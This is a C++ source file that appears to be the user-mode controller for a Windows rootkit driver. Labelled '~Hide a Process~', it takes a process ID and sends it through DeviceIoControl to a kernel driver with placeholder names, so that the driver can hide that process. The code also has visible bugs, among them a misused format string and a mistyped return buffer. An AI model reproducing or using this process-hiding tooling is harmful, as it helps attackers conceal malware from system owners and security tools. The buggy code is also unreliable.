#include "main.h"
#include <iostream>

#define SERVICE "SERVICEDISPLAYNAME"
#define DEVICE "\\\\.\\DEVICEDISPLAYNAME"
#define DRIVER "PATH:\\\\TO\\DRIVER\\driver.sys"
#define IOCTL_CODE 0x815

HANDLE getHandle();
int main(int argc, char* argv[]);


int main(int argc, char* argv[])
{

	HANDLE hDevice;

	std::cout << ("[REQUIRES ELEVATED PRIVILEGES]\n");
	if (argc != 2)
	{
		std::cout << ("Usage Error: [PROVIDE A PROCESS PID] (example: 4)\n");
		exit(EXIT_FAILURE);
	}
	std::cout << ("~Hide a Process~\n{Usage: user.exe [process pid]}\n");

	char* pid = argv[1];
	if (atoi(pid) == 0)
	{
		std::cout << ("[-] Process [%s] not found!\n", argv[1]);
		exit(2);
	}
	std::cout << ("[+] IOCTL msg : PID set to ");
	std::cout << argv[1]; std::cout << "\n";

	hDevice = getHandle();
	if (hDevice == NULL) { exit(1); }
	std::cout << ("[+] Recieved driver handle!\n");
	std::cout << ("[*] IOCTL to driver\n");

	char* retbuf[1024];
	ULONG ret_bytes;
	BOOLEAN ioctl = DeviceIoControl
	(
		hDevice,
		IOCTL_CODE,
		pid,
		strlen(pid) + 1,
		retbuf,
		200,
		&ret_bytes,
		(LPOVERLAPPED)NULL
	);

	if (!ioctl)
	{
		std::cout << ("[-] IRP failed.\n");
		exit(1);
	}

	std::cout << ("[+] IRP sent recieved-> ");
	std::cout << retbuf;

	return 0;
}

HANDLE getHandle()
{
	HANDLE hDevice = CreateFile
	(
		TEXT(DEVICE),
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		std::cout << ("[-] Couldn't find Driver!\n");
		exit(1);
	}

	return hDevice;
}


